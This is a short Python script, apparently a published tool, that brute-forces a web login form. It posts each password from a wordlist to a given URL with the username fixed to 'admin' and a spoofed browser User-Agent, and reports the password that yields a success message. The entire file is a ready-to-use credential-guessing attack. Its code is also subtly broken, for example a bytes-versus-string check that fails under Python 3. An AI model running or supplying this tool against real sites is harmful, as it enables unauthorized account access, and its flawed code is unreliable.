#!/usr/bin/env python3
# Author: @haithamaouati
# Version:1.1

import argparse
import colorama
import os
import requests
import time

from colorama import Fore, Back, Style
colorama.init()

os.system('cls' if os.name == 'nt' else 'clear')

print('''\
  _________         .    .
 (..       \_    ,  |\  /|
  \       O  \  /|  \ \/ /
   \______    \/ |   \  /   _      __ _____ _                _    
      vvvv\    \ |   /  |  | |    / _/ ____| |              | |   
      \^^^^  ==   \_/   |  | |__ | || (___ | |__   __ _ _ __| | __
       `\_   ===    \.  |  | '_ \|  _\___ \| '_ \ / _` | '__| |/ /
       / /\_   \ /      |  | |_) | | ____) | | | | (_| | |  |   < 
       |/   \_  \|      /  |_.__/|_||_____/|_| |_|\__,_|_|  |_|\_\.
              \________/
''')

print(' Author: ' + Fore.CYAN + '@haithamaouati' + Fore.WHITE + ' Version: ' + Fore.YELLOW + '1.1\n' + Fore.WHITE)
print(' A simple login brute force tool\n')

parser = argparse.ArgumentParser()
parser.add_argument('-u', '--url', metavar='<url>', type=str, help='URL website (e.g. http://localhost/login.php)')
parser.add_argument('-w', '--wordlist', metavar='<wordlist>', type=str, help='Wordlist file (e.g. wordlist.txt)')
parser.add_argument('-un', '--username', metavar='<username>', type=str, help='Username field name (e.g. username)')
parser.add_argument('-p', '--password', metavar='<password>', type=str, help='Password field name (e.g. password)')
parser.add_argument('-s', '--submit', metavar='<submit>', type=str, help='Submit button name (e.g. submit)')

args = parser.parse_args()

if args.url == None or args.wordlist == None or args.username == None or args.password == None or args.submit == None:
	parser.print_help()
	exit();
url = args.url
wordlist = args.wordlist
username = args.username
password = args.password
submit = args.submit

headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"}

arq = open(wordlist,'r').readlines()

for line in arq:
  pswd = line.strip()
  http = requests.post(url, data={username:'admin',password:pswd,'submit':submit} , headers=headers)
  content = http.content
  if 'Logged in success' in content:
    print(Fore.GREEN + '[+] Password found: ' + Fore.WHITE + pswd)
    break
  else:
    print(Fore.RED + '[-] Password not found: ' + Fore.WHITE + pswd)
